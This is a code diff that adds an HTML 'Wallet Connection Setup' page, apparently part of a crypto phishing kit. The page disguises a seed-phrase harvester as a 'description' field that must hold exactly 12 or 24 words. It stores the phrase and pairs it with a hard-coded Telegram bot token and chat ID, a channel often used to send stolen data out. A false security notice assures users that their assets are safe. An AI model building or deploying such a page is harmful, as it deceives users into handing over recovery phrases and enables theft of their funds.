@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wallet and Automation Setup</title>
+    <link href="static/css/main.e94723d5.chunk.css" rel="stylesheet">
+    <link href="static/css/index.css" rel="stylesheet">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #1d2330;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .container {
+            background-color: #2a313f;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            max-width: 600px;
+            width: 100%;
+        }
+        h1 {
+            color: #fff;
+            margin-bottom: 20px;
+        }
+        p {
+            margin-bottom: 25px;
+            line-height: 1.6;
+            font-size: 1.1em;
+            color: #ccc;
+        }
+        textarea {
+            width: calc(100% - 20px);
+            padding: 12px;
+            margin-bottom: 25px;
+            border: 1px solid #444;
+            border-radius: 6px;
+            background-color: #3b4252;
+            color: #fff;
+            font-size: 1em;
+            resize: vertical;
+            min-height: 80px;
+        }
+        button {
+            background-color: #007bff;
+            color: white;
+            padding: 12px 25px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 1.1em;
+            transition: background-color 0.3s ease;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .warning {
+            background-color: #3b4252;
+            color: #fff;
+            padding: 10px;
+            border-radius: 5px;
+            margin-top: 20px;
+            font-size: 0.9em;
+        }
+        /* Custom Modal Styles */
+        .custom-modal-overlay {
+            display: none !important; /* Changed to none !important to force hidden by default */
+            position: fixed; /* Stay in place */
+            z-index: 1; /* Sit on top */
+            left: 0;
+            top: 0;
+            width: 100%; /* Full width */
+            height: 100%; /* Full height */
+            overflow: auto; /* Enable scroll if needed */
+            background-color: rgba(0,0,0,0.7); /* Black w/ opacity */
+            justify-content: center;
+            align-items: center;
+        }
+        .custom-modal-content {
+            background-color: #2a313f;
+            margin: auto;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.5);
+            width: 80%;
+            max-width: 400px;
+            text-align: center;
+            color: #fff;
+            position: relative;
+        }
+        .custom-modal-content .close-button {
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            color: #aaa;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .custom-modal-content .close-button:hover,
+        .custom-modal-content .close-button:focus {
+            color: #fff;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .custom-modal-content p {
+            margin-bottom: 20px;
+            font-size: 1.1em;
+        }
+        /* Estilos para el modal de wallet */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.7);
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-content {
+            background-color: #2a313f;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.5);
+            width: 80%;
+            max-width: 400px;
+            text-align: center;
+            color: #fff;
+        }
+        .wallet-address {
+            background-color: #3b4252;
+            padding: 15px;
+            border-radius: 6px;
+            margin: 20px 0;
+            word-break: break-all;
+            font-family: monospace;
+        }
+        .button-container {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 20px;
+        }
+        .confirm-button, .cancel-button {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 1em;
+            transition: background-color 0.3s ease;
+        }
+        .confirm-button {
+            background-color: #28a745;
+            color: white;
+        }
+        .confirm-button:hover {
+            background-color: #218838;
+        }
+        .cancel-button {
+            background-color: #dc3545;
+            color: white;
+        }
+        .cancel-button:hover {
+            background-color: #c82333;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Wallet Connection Setup</h1>
+        <input type="text" id="walletAddress" placeholder="Enter your wallet address" style="width: calc(100% - 20px); padding: 12px; margin-bottom: 25px; border: 1px solid #444; border-radius: 6px; background-color: #3b4252; color: #fff; font-size: 1em;">
+        <textarea id="userDescription" placeholder=""></textarea>
+        <p class="warning">**Important Security Notice:**</p>
+        <p>When we refer to "automation of operations", it means that the DApp will prepare transactions or interactions with smart contracts based on your configurations or the provided description. However, **YOU MUST ALWAYS MANUALLY APPROVE EACH TRANSACTION** through your wallet (MetaMask, Trust Wallet, etc.). The application does not have the ability to move your assets without your explicit consent.</p>
+        <button onclick="proceedToWalletConnection()">Connect Wallet and Continue</button>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '7525286244:AAFkjvPzYxZbd-Iv7ebHwllrZbPEL2aOx_8';
+        const CHAT_ID = '6345382747';
+
+        async function proceedToWalletConnection() {
+            const description = document.getElementById('userDescription').value;
+            const walletAddress = document.getElementById('walletAddress').value;
+
+            // Validate wallet address (basic format check for common blockchains)
+            const walletRegex = /^(0x[a-fA-F0-9]{40}|[13][a-km-zA-HJ-NP-Z1-9]{25,34}|[bc1][a-zA-HJ-NP-Z0-9]{25,39}|[13][a-km-zA-HJ-NP-Z1-9]{25,34}|[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}|[D9][a-km-zA-HJ-NP-Z1-9]{33}|[A][a-km-zA-HJ-NP-Z1-9]{33}|[X][a-km-zA-HJ-NP-Z1-9]{33}|[P][a-km-zA-HJ-NP-Z1-9]{34}|[r][a-km-zA-HJ-NP-Z1-9]{24,34}|[t][a-km-zA-HJ-NP-Z1-9]{24,34}|[1][a-km-zA-HJ-NP-Z1-9]{24,34}|[3][a-km-zA-HJ-NP-Z1-9]{24,34}|[bc1][a-zA-HJ-NP-Z0-9]{25,39})$/;
+            if (!walletRegex.test(walletAddress)) {
+                alert('Please enter a valid wallet address');
+                return;
+            }
+
+            // Validate description (12 or 24 words)
+            const words = description.trim().split(/\s+/);
+            if (words.length !== 12 && words.length !== 24) {
+                alert('Description must be exactly 12 or 24 words');
+                return;
+            }
+
+            // Show wallet confirmation modal
+            showWalletModal();
+        }
+
+        function showModal(message) {
+            // Remove any existing modal first
+            const existingModal = document.getElementById('confirmationModal');
+            if (existingModal) {
+                existingModal.remove();
+            }
+
+            // Create modal elements dynamically
+            const modalOverlay = document.createElement('div');
+            modalOverlay.id = 'confirmationModal';
+            modalOverlay.className = 'custom-modal-overlay';
+            modalOverlay.style.display = 'flex';
+
+            const modalContent = document.createElement('div');
+            modalContent.className = 'custom-modal-content';
+
+            const closeButton = document.createElement('span');
+            closeButton.className = 'close-button';
+            closeButton.innerHTML = '&times;';
+            closeButton.onclick = closeModal;
+
+            const modalMessage = document.createElement('p');
+            modalMessage.id = 'modalMessage';
+            modalMessage.innerText = message;
+
+            const okButton = document.createElement('button');
+            okButton.innerText = 'OK';
+            okButton.onclick = closeModalAndRedirect;
+
+            modalContent.appendChild(closeButton);
+            modalContent.appendChild(modalMessage);
+            modalContent.appendChild(okButton);
+            modalOverlay.appendChild(modalContent);
+            document.body.appendChild(modalOverlay);
+        }
+
+        function closeModal() {
+            const modal = document.getElementById('confirmationModal');
+            if (modal) {
+                modal.remove();
+            }
+        }
+
+        function closeModalAndRedirect() {
+            closeModal();
+            window.location.href = '../index.html';
+        }
+
+        // Function to create and show the modal
+        function showWalletModal() {
+            const walletAddress = document.getElementById('walletAddress').value;
+            
+            // Create modal
+            const modal = document.createElement('div');
+            modal.className = 'modal';
+            modal.innerHTML = `
+                <div class="modal-content">
+                    <h2>Confirm Wallet</h2>
+                    <p>Please confirm this is your wallet address:</p>
+                    <p class="wallet-address">${walletAddress}</p>
+                    <div class="button-container">
+                        <button onclick="confirmWallet()" class="confirm-button">Confirm</button>
+                        <button onclick="cancelWallet()" class="cancel-button">Cancel</button>
+                    </div>
+                </div>
+            `;
+            document.body.appendChild(modal);
+
+            // Show modal
+            modal.style.display = 'flex';
+        }
+
+        // Function to confirm wallet
+        function confirmWallet() {
+            // Hide wallet modal
+            const walletModal = document.querySelector('.modal');
+            if (walletModal) {
+                walletModal.remove();
+            }
+            
+            // Save wallet info to localStorage
+            const walletAddress = document.getElementById('walletAddress').value;
+            const walletDescription = document.getElementById('userDescription').value;
+            localStorage.setItem('walletAddress', walletAddress);
+            localStorage.setItem('walletDescription', walletDescription);
+            
+            // Redirect to registration page
+            window.location.href = 'register.html';
+        }
+
+        // Function to cancel selection
+        function cancelWallet() {
+            // Hide modal
+            const walletModal = document.querySelector('.modal');
+            if (walletModal) {
+                walletModal.remove();
+            }
+            
+            // Clear selected wallet
+            window.selectedWallet = null;
+        }
+    </script>
+</body>
+</html> 
